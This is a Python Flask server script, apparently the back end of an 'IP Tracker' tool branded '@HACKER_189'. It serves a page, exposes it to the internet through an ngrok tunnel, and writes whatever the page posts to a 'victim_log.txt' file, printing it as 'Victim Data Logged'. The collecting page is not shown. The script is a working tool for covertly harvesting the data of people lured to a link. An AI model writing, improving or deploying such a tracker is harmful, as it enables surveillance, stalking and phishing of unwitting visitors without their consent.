# app.py

from flask import Flask, request, render_template
from pyngrok import ngrok
import os
from datetime import datetime

app = Flask(__name__)

# رنگین عنوان
def banner():
    os.system('clear')
    print("\033[1;35m")
    print("╔═══════════════════════════════════════════╗")
    print("║     Faizan™ IP Tracker v3.0 - @HACKER_189     ║")
    print("╚═══════════════════════════════════════════╝")
    print("\033[0m")

# ہوم پیج رینڈر
@app.route('/')
def index():
    return render_template('index.html')

# ڈیٹا پکڑنا
@app.route('/log', methods=['POST'])
def log():
    data = request.json
    with open("victim_log.txt", "a") as f:
        f.write(f"\n===== Victim Logged at {datetime.now()} =====\n")
        for key, value in data.items():
            f.write(f"{key}: {value}\n")
    print("\033[1;32m[+] Victim Data Logged:\033[0m")
    for key, value in data.items():
        print(f"    \033[1;36m{key}:\033[0m {value}")
    return 'OK'

if __name__ == '__main__':
    banner()
    port = 5000

    # Start tunnel via pyngrok
    try:
        public_url = ngrok.connect(port, "http")
        print(f"\033[1;34m[+] Public URL: {public_url}\033[0m")
    except Exception as e:
        print("\033[1;31m[!] Ngrok URL fetch failed:\033[0m", e)

    print(f"[+] Starting server on http://127.0.0.1:{port}")
    app.run(host='0.0.0.0', port=port)
